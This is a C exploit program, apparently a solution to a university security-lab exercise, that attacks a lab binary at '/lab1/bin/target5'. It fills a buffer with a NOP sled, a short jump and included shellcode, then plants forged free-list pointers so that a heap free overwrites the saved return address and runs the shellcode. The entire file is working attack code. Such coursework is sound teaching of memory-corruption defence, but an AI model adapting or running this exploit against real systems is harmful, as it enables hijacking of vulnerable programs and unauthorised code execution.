#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/lab1/bin/target5"
#define NOOP 0x90                 // no-op instruction
#define BUFLEN 120                // target buffer length
#define L_LEN 4                   // byte length of left pointer
#define R_LEN 4                   // byte length of right pointer
#define NULL_LEN 1                // byte length for null byte
#define BUF_START 0xffffdef6       // addr of the start of the buffer (p)
#define ADDR_RET_ADDR 0xffffdd60  // &RET
#define JMP_SHORT_0x6 "\xeb\x06"  // instruction for jump 6 bytes
#define FREE_BIT_BYTE 0x01

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[BUFLEN * 2];

  memset(buf, NOOP, sizeof(buf) - 1);
  buf[BUFLEN * 2 - 1] = '\0';

  memcpy(buf, JMP_SHORT_0x6, sizeof(JMP_SHORT_0x6) - 1);
  buf[4] = FREE_BIT_BYTE;
  memcpy(buf + L_LEN + R_LEN, shellcode, sizeof(shellcode) - 1);
  *(unsigned int*) (buf + BUFLEN) = BUF_START;
  *(unsigned int*) (buf + BUFLEN + L_LEN) = ADDR_RET_ADDR;

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
